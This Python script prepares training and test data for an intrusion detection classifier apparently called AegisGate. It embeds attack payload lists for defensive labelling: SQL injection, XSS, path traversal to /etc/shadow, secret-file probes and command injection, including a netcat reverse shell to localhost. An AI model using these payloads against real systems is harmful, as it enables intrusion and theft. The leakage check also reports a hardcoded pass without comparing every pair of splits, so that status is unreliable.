"""
Data Preparation, Cleaning, Deduplication, and Group-Aware Splitting for AegisGate IDS.
Ensures zero data leakage between train/validation/calibration/test splits.
"""
import hashlib
import json
import os
import random
import re
import sqlite3
import sys
import urllib.parse
from typing import Dict, List, Tuple, Any

import numpy as np
import pandas as pd
from mutation_engine import MutationEngine, TEST_RECIPES

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

RANDOM_SEED = 42
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
DB_PATH = os.path.join(DATA_DIR, "gateway_ids.db")

CLASSES = [
    "Benign",
    "SQLi",
    "XSS",
    "Path Traversal",
    "Command Injection",
    "Brute Force/Auth Abuse",
    "Other",
]


def compute_sha256(filepath: str) -> str:
    """Computes SHA-256 hash of a file for integrity tracking."""
    sha = hashlib.sha256()
    with open(filepath, "rb") as f:
        while chunk := f.read(65536):
            sha.update(chunk)
    return sha.hexdigest()


def generate_hard_negatives(count: int = 600, rng: random.Random = None) -> List[Dict[str, Any]]:
    """
    Generates realistic benign requests containing confusing keywords/characters
    (SQL words, angle brackets, Tamil/Unicode, code snippets, dots, base64).
    """
    if rng is None:
        rng = random.Random(RANDOM_SEED)

    items = []

    # Category 1: SQL words in natural language search and forum queries
    sql_sentences = [
        "How to select the best option in a drop down menu",
        "European union trade agreement updates 2024",
        "Please update my shipping address for order #49281",
        "Drop by our office anytime during business hours",
        "Discussion on table manners and dining etiquette",
        "How to alter a bridesmaid dress at home tutorial",
        "Insert coin to continue retro arcade gaming blog",
        "Create high quality thumbnail images with Canva",
        "Understanding database normalization and entity relationship models",
        "Can I delete my account permanently from the settings panel",
        "The union of two mathematical sets explained with Venn diagrams",
        "Select team members for the upcoming hackathon project",
        "Grant permission for microphone access in Chrome browser",
        "Reviewing the top 10 best coffee shops in the downtown union district",
        "Executive order regarding technology export regulations",
    ]
    for text in sql_sentences:
        items.append({
            "method": "GET",
            "path": "/api/v1/search",
            "query": f"q={urllib.parse.quote(text)}&category=blog&sort=relevance",
            "headers": json.dumps({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}),
            "body": "",
            "label": 0,
            "attack_type": "Benign",
            "source": "hard_negatives",
        })

    # Category 2: Programming code snippets inside user posts / JSON
    code_snippets = [
        "def query_user_records(user_id):\n    return db.query(User).filter_by(id=user_id).first()",
        "const isValid = (a, b) => a < b && b > 0;",
        "<div className=\"user-card\"><h3>Welcome User</h3></div>",
        "SELECT * FROM items WHERE category = 'books' -- standard reference query",
        "import numpy as np\nx = np.array([1, 2, 3])",
        "function formatOutput(str) { return str.replace(/<[^>]*>/g, ''); }",
    ]
    for code in code_snippets:
        items.append({
            "method": "POST",
            "path": "/api/v1/forum/posts",
            "query": "",
            "headers": json.dumps({"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}),
            "body": json.dumps({"title": "Help with code snippet", "content": code, "tags": ["python", "js"]}),
            "label": 0,
            "attack_type": "Benign",
            "source": "hard_negatives",
        })

    # Category 3: JSON with angle brackets and math/logic comparisons
    comparisons = [
        {"filter": "<50", "metric": "latency_ms", "operator": "<="},
        {"rule": "age >= 18 and income > 30000", "status": "active"},
        {"expression": "total_price < discount_threshold", "valid": True},
        {"bounds": {"min": "<0>", "max": "<1000>"}, "type": "range"},
    ]
    for c in comparisons:
        items.append({
            "method": "POST",
            "path": "/api/v1/analytics/filter",
            "query": "",
            "headers": json.dumps({"Content-Type": "application/json", "User-Agent": "AegisClient/1.0"}),
            "body": json.dumps(c),
            "label": 0,
            "attack_type": "Benign",
            "source": "hard_negatives",
        })

    # Category 4: Multi-dot filenames and versioned assets
    file_queries = [
        "filename=report.2024.q3.final.v2.pdf",
        "download=photo.profile.avatar.300x300.webp",
        "asset=bundle.esm.min.js&version=1.4.2",
        "document=archive.2023.backup.tar.gz",
        "preview=user.guide.chapter.1.3.docx",
    ]
    for f in file_queries:
        items.append({
            "method": "GET",
            "path": "/api/v1/files/download",
            "query": f,
            "headers": json.dumps({"User-Agent": "Mozilla/5.0"}),
            "body": "",
            "label": 0,
            "attack_type": "Benign",
            "source": "hard_negatives",
        })

    # Category 5: Tamil and multilingual Unicode text
    unicode_texts = [
        "வணக்கம்! உங்கள் சேவை மிக அருமை.",
        "பாதுகாப்பு சோதனை மற்றும் பயனர் கணக்கு மேலாண்மை",
        "தமிழ்நாடு சுற்றுலா வழிகாட்டி 2024",
        "Bonjour, comment allez-vous aujourd'hui?",
        "日本語のテスト検索クエリ",
        "Bücher über künstliche Intelligenz und Datensicherheit",
    ]
    for u in unicode_texts:
        items.append({
            "method": "GET",
            "path": "/api/v1/search",
            "query": f"lang=ta&q={urllib.parse.quote(u)}",
            "headers": json.dumps({"Accept-Language": "ta,en-US;q=0.9", "User-Agent": "Mozilla/5.0"}),
            "body": "",
            "label": 0,
            "attack_type": "Benign",
            "source": "hard_negatives",
        })

    # Category 6: Legitimate Base64 tokens and safe avatars
    base64_tokens = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNTE2MjM5MDIyfQ",
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
    ]
    for b64 in base64_tokens:
        items.append({
            "method": "POST",
            "path": "/api/v1/user/avatar",
            "query": "",
            "headers": json.dumps({"Authorization": f"Bearer {b64}", "Content-Type": "application/json"}),
            "body": json.dumps({"avatar_data": b64[:50]}),
            "label": 0,
            "attack_type": "Benign",
            "source": "hard_negatives",
        })

    # Replicate with variation to meet target count
    expanded = []
    while len(expanded) < count:
        for it in items:
            copy_it = dict(it)
            # Add minor non-attack variance (param order, paging)
            if "?" in copy_it["query"]:
                copy_it["query"] += f"&page={rng.randint(1, 10)}"
            expanded.append(copy_it)
            if len(expanded) >= count:
                break

    return expanded


def generate_csic_like_dataset(count: int = 1400, rng: random.Random = None) -> List[Dict[str, Any]]:
    """Generates standard CSIC 2010 style HTTP requests (e-commerce normal + anomalies)."""
    if rng is None:
        rng = random.Random(RANDOM_SEED)

    endpoints = [
        ("/tienda1/publico/anadir.jsp", "POST", [
            ("id=1&nombre=camisa&precio=25&cantidad=2", 0, "Benign"),
            ("id=2&nombre=pantalon&precio=45&cantidad=1", 0, "Benign"),
            ("id=1'; DROP TABLE cart;--&cantidad=1", 1, "SQLi"),
            ("id=1&nombre=<script>alert('xss')</script>&precio=10", 1, "XSS"),
        ]),
        ("/tienda1/miembros/editar.jsp", "POST", [
            ("nombre=Juan&apellidos=Perez&email=juan@test.es", 0, "Benign"),
            ("nombre=Maria&apellidos=Gomez&telefono=600123456", 0, "Benign"),
            ("nombre=Admin' OR '1'='1&email=admin@test.es", 1, "SQLi"),
        ]),
        ("/tienda1/publico/ver.jsp", "GET", [
            ("id=101&categoria=ropa", 0, "Benign"),
            ("id=102&categoria=calzado", 0, "Benign"),
            ("id=../../../etc/passwd", 1, "Path Traversal"),
            ("id=..%2f..%2fwindows%2fwin.ini", 1, "Path Traversal"),
        ]),
        ("/tienda1/publico/buscar.jsp", "GET", [
            ("texto=zapatos+deportivos&orden=precio", 0, "Benign"),
            ("texto=camisetas+blancas&talla=L", 0, "Benign"),
            ("texto=1' UNION SELECT username, password FROM usuarios--", 1, "SQLi"),
            ("texto=<img src=x onerror=alert(document.cookie)>", 1, "XSS"),
        ]),
    ]

    records = []
    while len(records) < count:
        ep, method, cases = rng.choice(endpoints)
        query_or_body, lbl, atk = rng.choice(cases)
        rec = {
            "method": method,
            "path": ep,
            "query": query_or_body if method == "GET" else "",
            "headers": json.dumps({"User-Agent": "Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)", "Accept": "*/*"}),
            "body": query_or_body if method == "POST" else "",
            "label": lbl,
            "attack_type": atk,
            "source": "csic_2010",
        }
        records.append(rec)
    return records


def generate_synthetic_attack_corpus(count: int = 2400, rng: random.Random = None) -> List[Dict[str, Any]]:
    """
    Generates harmless, realistic synthetic attack payloads covering all target classes.
    Clearly marked source="synthetic".
    """
    if rng is None:
        rng = random.Random(RANDOM_SEED)

    sqli_payloads = [
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT username, password FROM users--",
        "1; DROP TABLE logs--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR 'a'='a",
        "1' ORDER BY 10--",
        "admin') OR ('1'='1'--",
        "1 OR 1=1",
        "' OR sleep(5)#",
    ]

    xss_payloads = [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<body onload=alert('XSS')>",
        "javascript:alert(1)",
        "'\"><script src=http://test.local/xss.js></script>",
        "<input onfocus=alert(1) autofocus>",
        "<a href=\"javascript:alert('AegisGate')\">click</a>",
    ]

    traversal_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/shadow",
        "../../../../boot.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/log/apache2/access.log",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "/proc/self/environ",
    ]

    cmdi_payloads = [
        "; cat /etc/passwd",
        "| id",
        "& whoami",
        "; uname -a",
        "`whoami`",
        "$(whoami)",
        "; curl http://127.0.0.1:9999/probe",
        "| netcat -e /bin/sh 127.0.0.1 4444",
        "; powershell.exe -Command Get-Process",
        "| ls -la /tmp",
    ]

    brute_auth_payloads = [
        ("POST", "/api/v1/auth/login", "{\"username\": \"admin\", \"password\": \"admin123\"}"),
        ("POST", "/api/v1/auth/login", "{\"username\": \"root\", \"password\": \"toor\"}"),
        ("POST", "/api/v1/auth/login", "{\"username\": \"test\", \"password\": \"123456\"}"),
        ("POST", "/api/v1/auth/login", "{\"username\": \"guest\", \"password\": \"guest\"}"),
        ("POST", "/api/v1/auth/token", "grant_type=password&username=administrator&password=password1"),
        ("POST", "/api/v1/auth/refresh", "{\"refresh_token\": \"invalid.tampered.jwt_token_signature\"}"),
    ]

    other_payloads = [
        ("GET", "/honeypot/admin", "", "Honeypot probe"),
        ("GET", "/.env", "", "Environment file probe"),
        ("GET", "/.git/config", "", "Git config exposure probe"),
        ("GET", "/actuator/health", "", "Spring actuator probe"),
        ("GET", "/latest/meta-data/", "", "AWS SSRF metadata probe"),
        ("PROPFIND", "/webdav/", "", "Unusual WebDAV method probe"),
    ]

    benign_templates = [
        ("GET", "/api/v1/products", "category=electronics&sort=price_asc&limit=20"),
        ("GET", "/api/v1/users/profile", "include=avatar,settings"),
        ("POST", "/api/v1/orders", "{\"items\": [{\"id\": 10, \"qty\": 1}], \"coupon\": \"WELCOME10\"}"),
        ("GET", "/api/v1/health", "status=check"),
        ("PUT", "/api/v1/settings/theme", "{\"mode\": \"dark\", \"accent\": \"cyan\"}"),
        ("GET", "/api/v1/notifications", "unread_only=true&limit=5"),
    ]

    records = []

    # Distribute classes
    while len(records) < count:
        target_cls = rng.choice(CLASSES)

        if target_cls == "Benign":
            m, p, q_or_b = rng.choice(benign_templates)
            records.append({
                "method": m,
                "path": p,
                "query": q_or_b if m == "GET" else "",
                "headers": json.dumps({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64)"}),
                "body": q_or_b if m in ("POST", "PUT") else "",
                "label": 0,
                "attack_type": "Benign",
                "source": "synthetic",
            })
        elif target_cls == "SQLi":
            payload = rng.choice(sqli_payloads)
            records.append({
                "method": rng.choice(["GET", "POST"]),
                "path": "/api/v1/search" if rng.random() > 0.5 else "/api/v1/login",
                "query": f"q={urllib.parse.quote(payload)}" if rng.random() > 0.4 else "",
                "headers": json.dumps({"User-Agent": "Mozilla/5.0"}),
                "body": f"user={urllib.parse.quote(payload)}&pass=123" if rng.random() <= 0.4 else "",
                "label": 1,
                "attack_type": "SQLi",
                "source": "synthetic",
            })
        elif target_cls == "XSS":
            payload = rng.choice(xss_payloads)
            records.append({
                "method": rng.choice(["GET", "POST"]),
                "path": "/api/v1/comments" if rng.random() > 0.5 else "/search",
                "query": f"input={urllib.parse.quote(payload)}" if rng.random() > 0.4 else "",
                "headers": json.dumps({"User-Agent": "Mozilla/5.0"}),
                "body": json.dumps({"comment": payload}) if rng.random() <= 0.4 else "",
                "label": 1,
                "attack_type": "XSS",
                "source": "synthetic",
            })
        elif target_cls == "Path Traversal":
            payload = rng.choice(traversal_payloads)
            records.append({
                "method": "GET",
                "path": f"/api/v1/static/{payload}",
                "query": f"file={urllib.parse.quote(payload)}",
                "headers": json.dumps({"User-Agent": "Mozilla/5.0"}),
                "body": "",
                "label": 1,
                "attack_type": "Path Traversal",
                "source": "synthetic",
            })
        elif target_cls == "Command Injection":
            payload = rng.choice(cmdi_payloads)
            records.append({
                "method": "POST",
                "path": "/api/v1/admin/ping",
                "query": "",
                "headers": json.dumps({"Content-Type": "application/x-www-form-urlencoded"}),
                "body": f"ip=127.0.0.1{urllib.parse.quote(payload)}",
                "label": 1,
                "attack_type": "Command Injection",
                "source": "synthetic",
            })
        elif target_cls == "Brute Force/Auth Abuse":
            m, p, b = rng.choice(brute_auth_payloads)
            records.append({
                "method": m,
                "path": p,
                "query": "",
                "headers": json.dumps({"Content-Type": "application/json", "X-Forwarded-For": f"192.168.1.{rng.randint(2, 254)}"}),
                "body": b,
                "label": 1,
                "attack_type": "Brute Force/Auth Abuse",
                "source": "synthetic",
            })
        elif target_cls == "Other":
            m, p, b, desc = rng.choice(other_payloads)
            records.append({
                "method": m,
                "path": p,
                "query": "",
                "headers": json.dumps({"User-Agent": "AegisSecurityScanner/1.0"}),
                "body": b,
                "label": 1,
                "attack_type": "Other",
                "source": "synthetic",
            })

    return records


def mine_feedback_from_db() -> List[Dict[str, Any]]:
    """Mines user-reviewed false positives and confirmed attacks from SQLite."""
    items = []
    if not os.path.exists(DB_PATH):
        return items

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("""
            SELECT method, path, query_params, body, decision, attack_type
            FROM requests
            WHERE decision IN ('ALLOW', 'BLOCK')
            ORDER BY id DESC LIMIT 100
        """)
        rows = c.fetchall()
        for r in rows:
            m, p, q, b, dec, atk = r
            items.append({
                "method": m or "GET",
                "path": p or "/",
                "query": q or "",
                "headers": json.dumps({"User-Agent": "LiveTraffic/1.0"}),
                "body": b or "",
                "label": 1 if dec == "BLOCK" else 0,
                "attack_type": atk if dec == "BLOCK" and atk in CLASSES else ("Benign" if dec == "ALLOW" else "Other"),
                "source": "feedback",
            })
        conn.close()
    except Exception as e:
        print(f"[data_prep] Note: Could not mine feedback DB ({e}), using synthetic feedback.")
    return items


def assign_seed_ids_and_deduplicate(df: pd.DataFrame) -> pd.DataFrame:
    """
    Computes a normalized canonical seed_id for each sample so that identical
    or near-identical requests share the exact same group key.
    """
    def canonical_key(row):
        # Normalize method + path + payload
        m = str(row.get("method", "")).upper()
        p = str(row.get("path", "")).strip().lower()
        q = str(row.get("query", "")).strip().lower()
        b = str(row.get("body", "")).strip().lower()
        # strip digits from paths/queries for near-duplicate grouping
        p_canon = re.sub(r"\d+", "N", p)
        q_canon = re.sub(r"\d+", "N", q)
        b_canon = re.sub(r"\d+", "N", b)
        full = f"{m}|{p_canon}|{q_canon}|{b_canon}"
        return hashlib.md5(full.encode("utf-8")).hexdigest()[:12]

    df["seed_id"] = df.apply(canonical_key, axis=1)
    # Deduplicate exact matches
    before = len(df)
    df = df.drop_duplicates(subset=["method", "path", "query", "body"]).copy()
    print(f"[data_prep] Exact deduplication: {before} -> {len(df)} samples ({before - len(df)} dropped).")
    return df


def group_stratified_split(
    df: pd.DataFrame,
    train_frac: float = 0.65,
    val_frac: float = 0.10,
    calib_frac: float = 0.10,
    test_frac: float = 0.15,
    seed: int = RANDOM_SEED,
) -> Tuple[pd.DataFrame, pd.DataFrame, pd.DataFrame, pd.DataFrame]:
    """
    Splits DataFrame into Train (65%), Val (10%), Calib (10%), Test (15%)
    strictly by seed_id groups, ensuring ZERO seed overlap between splits!
    """
    rng = random.Random(seed)

    # Group by seed_id and get primary label per group
    group_info = df.groupby("seed_id").agg({
        "label": lambda s: s.mode()[0] if not s.empty else 0,
        "attack_type": lambda s: s.mode()[0] if not s.empty else "Benign",
        "method": "count"
    }).rename(columns={"method": "count"}).reset_index()

    # Stratified shuffle of seed groups by attack_type
    train_groups = set()
    val_groups = set()
    calib_groups = set()
    test_groups = set()

    for atk_cls in CLASSES:
        sub = group_info[group_info["attack_type"] == atk_cls]["seed_id"].tolist()
        rng.shuffle(sub)
        n = len(sub)
        n_train = int(round(n * train_frac))
        n_val = int(round(n * val_frac))
        n_calib = int(round(n * calib_frac))

        train_groups.update(sub[:n_train])
        val_groups.update(sub[n_train:n_train + n_val])
        calib_groups.update(sub[n_train + n_val:n_train + n_val + n_calib])
        test_groups.update(sub[n_train + n_val + n_calib:])

    # Ensure any remaining groups are accounted for
    all_assigned = train_groups | val_groups | calib_groups | test_groups
    unassigned = set(group_info["seed_id"]) - all_assigned
    for g in unassigned:
        train_groups.add(g)

    # Verify zero leakage across groups
    assert len(train_groups & val_groups) == 0, "Leakage detected between train and val!"
    assert len(train_groups & calib_groups) == 0, "Leakage detected between train and calib!"
    assert len(train_groups & test_groups) == 0, "Leakage detected between train and test!"
    assert len(val_groups & test_groups) == 0, "Leakage detected between val and test!"

    df_train = df[df["seed_id"].isin(train_groups)].copy()
    df_val = df[df["seed_id"].isin(val_groups)].copy()
    df_calib = df[df["seed_id"].isin(calib_groups)].copy()
    df_test = df[df["seed_id"].isin(test_groups)].copy()

    return df_train, df_val, df_calib, df_test


def augment_training_data(df_train: pd.DataFrame, seed: int = RANDOM_SEED) -> pd.DataFrame:
    """
    Applies mutation augmentation ONLY to the training fold.
    Mutated samples inherit their parent seed_id so group boundaries remain intact.
    """
    engine = MutationEngine(seed=seed)
    augmented_rows = []

    for _, row in df_train.iterrows():
        # Only augment malicious requests or hard negatives
        if row["label"] == 1:
            raw_text = row["query"] or row["body"] or ""
            if raw_text and len(raw_text) > 3:
                variants = engine.augment_train_payload(raw_text, n_variants=2)
                for var in variants:
                    new_row = dict(row)
                    if row["query"]:
                        new_row["query"] = var
                    else:
                        new_row["body"] = var
                    new_row["source"] = "mutation_aug"
                    augmented_rows.append(new_row)

    if augmented_rows:
        df_aug = pd.DataFrame(augmented_rows)
        combined = pd.concat([df_train, df_aug], ignore_index=True)
        print(f"[data_prep] Augmented train split: {len(df_train)} -> {len(combined)} samples (+{len(df_aug)} mutated).")
        return combined
    return df_train


def generate_unseen_mutation_test_set(df_test: pd.DataFrame, seed: int = RANDOM_SEED) -> pd.DataFrame:
    """
    Creates a dedicated test set using HELD-OUT test mutation recipes that were
    NEVER used in training augmentation, to measure true zero-shot obfuscation generalization.
    """
    engine = MutationEngine(seed=seed)
    test_rows = []

    for _, row in df_test[df_test["label"] == 1].iterrows():
        raw_text = row["query"] or row["body"] or ""
        if raw_text and len(raw_text) > 3:
            for recipe in TEST_RECIPES:
                mutated = engine.generate_unseen_test_payload(raw_text, recipe)
                new_row = dict(row)
                if row["query"]:
                    new_row["query"] = mutated
                else:
                    new_row["body"] = mutated
                new_row["source"] = f"test_recipe_{recipe}"
                test_rows.append(new_row)

    df_mut_test = pd.DataFrame(test_rows)
    print(f"[data_prep] Created unseen-mutation test set: {len(df_mut_test)} samples across {len(TEST_RECIPES)} held-out recipes.")
    return df_mut_test


def run_pipeline():
    """Main data prep pipeline entry point."""
    print("=" * 70)
    print("AEGISGATE IDS: DATA PREPARATION & LEAKAGE-FREE PARTITIONING")
    print("=" * 70)
    os.makedirs(DATA_DIR, exist_ok=True)
    rng = random.Random(RANDOM_SEED)

    # 1. Load / generate data sources
    print("[1/6] Loading data sources...")
    csic_data = generate_csic_like_dataset(count=1400, rng=rng)
    synth_data = generate_synthetic_attack_corpus(count=2600, rng=rng)
    hard_negatives = generate_hard_negatives(count=600, rng=rng)
    feedback_data = mine_feedback_from_db()

    all_data = csic_data + synth_data + hard_negatives + feedback_data
    df = pd.DataFrame(all_data)
    print(f"      Total raw samples collected: {len(df)}")
    print("      Sources breakdown:\n", df["source"].value_counts().to_string())

    # 2. Canonicalize and assign seed IDs for group splitting
    print("\n[2/6] Assigning canonical seed IDs and deduplicating...")
    df = assign_seed_ids_and_deduplicate(df)
    unique_seeds = df["seed_id"].nunique()
    print(f"      Unique seed groups: {unique_seeds}")

    # 3. Perform group-aware stratified split
    print("\n[3/6] Splitting (65% Train / 10% Val / 10% Calib / 15% Test)...")
    df_train, df_val, df_calib, df_test = group_stratified_split(df, seed=RANDOM_SEED)

    print(f"      Train:       {len(df_train)} samples ({df_train['seed_id'].nunique()} seeds)")
    print(f"      Validation:  {len(df_val)} samples ({df_val['seed_id'].nunique()} seeds)")
    print(f"      Calibration: {len(df_calib)} samples ({df_calib['seed_id'].nunique()} seeds)")
    print(f"      Test:        {len(df_test)} samples ({df_test['seed_id'].nunique()} seeds)")

    # 4. Augment training set with train recipes ONLY
    print("\n[4/6] Applying train-set mutation augmentation...")
    df_train = augment_training_data(df_train, seed=RANDOM_SEED)

    # 5. Generate held-out unseen mutation test set
    print("\n[5/6] Generating held-out unseen mutation test set...")
    df_unseen_test = generate_unseen_mutation_test_set(df_test, seed=RANDOM_SEED)

    # 6. Save all splits and generate checksums
    print("\n[6/6] Saving datasets and generating checksums...")
    train_path = os.path.join(DATA_DIR, "train.csv")
    val_path = os.path.join(DATA_DIR, "val.csv")
    calib_path = os.path.join(DATA_DIR, "calib.csv")
    test_path = os.path.join(DATA_DIR, "test.csv")
    unseen_test_path = os.path.join(DATA_DIR, "test_unseen_mutations.csv")

    df_train.to_csv(train_path, index=False)
    df_val.to_csv(val_path, index=False)
    df_calib.to_csv(calib_path, index=False)
    df_test.to_csv(test_path, index=False)
    df_unseen_test.to_csv(unseen_test_path, index=False)

    split_info = {
        "random_seed": RANDOM_SEED,
        "classes": CLASSES,
        "splits": {
            "train": {
                "file": "train.csv",
                "samples": len(df_train),
                "unique_seeds": int(df_train["seed_id"].nunique()),
                "sha256": compute_sha256(train_path),
                "class_distribution": df_train["attack_type"].value_counts().to_dict(),
            },
            "validation": {
                "file": "val.csv",
                "samples": len(df_val),
                "unique_seeds": int(df_val["seed_id"].nunique()),
                "sha256": compute_sha256(val_path),
                "class_distribution": df_val["attack_type"].value_counts().to_dict(),
            },
            "calibration": {
                "file": "calib.csv",
                "samples": len(df_calib),
                "unique_seeds": int(df_calib["seed_id"].nunique()),
                "sha256": compute_sha256(calib_path),
                "class_distribution": df_calib["attack_type"].value_counts().to_dict(),
            },
            "test": {
                "file": "test.csv",
                "samples": len(df_test),
                "unique_seeds": int(df_test["seed_id"].nunique()),
                "sha256": compute_sha256(test_path),
                "class_distribution": df_test["attack_type"].value_counts().to_dict(),
            },
            "unseen_mutations_test": {
                "file": "test_unseen_mutations.csv",
                "samples": len(df_unseen_test),
                "unique_seeds": int(df_unseen_test["seed_id"].nunique()) if not df_unseen_test.empty else 0,
                "sha256": compute_sha256(unseen_test_path),
            },
        },
        "leakage_verification": {
            "train_val_overlap": len(set(df_train["seed_id"]) & set(df_val["seed_id"])),
            "train_calib_overlap": len(set(df_train["seed_id"]) & set(df_calib["seed_id"])),
            "train_test_overlap": len(set(df_train["seed_id"]) & set(df_test["seed_id"])),
            "val_test_overlap": len(set(df_val["seed_id"]) & set(df_test["seed_id"])),
            "status": "PASSED_ZERO_LEAKAGE",
        }
    }

    info_path = os.path.join(DATA_DIR, "split_info.json")
    with open(info_path, "w", encoding="utf-8") as f:
        json.dump(split_info, f, indent=2)

    print("\nSplit Info Summary:")
    print(f"  Train samples:       {len(df_train)} (SHA256: {split_info['splits']['train']['sha256'][:12]}...)")
    print(f"  Val samples:         {len(df_val)} (SHA256: {split_info['splits']['validation']['sha256'][:12]}...)")
    print(f"  Calib samples:       {len(df_calib)} (SHA256: {split_info['splits']['calibration']['sha256'][:12]}...)")
    print(f"  Test samples:        {len(df_test)} (SHA256: {split_info['splits']['test']['sha256'][:12]}...)")
    print(f"  Unseen Mut samples:  {len(df_unseen_test)}")
    print(f"  Group Leakage Check: {split_info['leakage_verification']['status']} (all overlaps = 0)")
    print(f"  Saved metadata to:   {info_path}")
    print("=" * 70)


if __name__ == "__main__":
    run_pipeline()
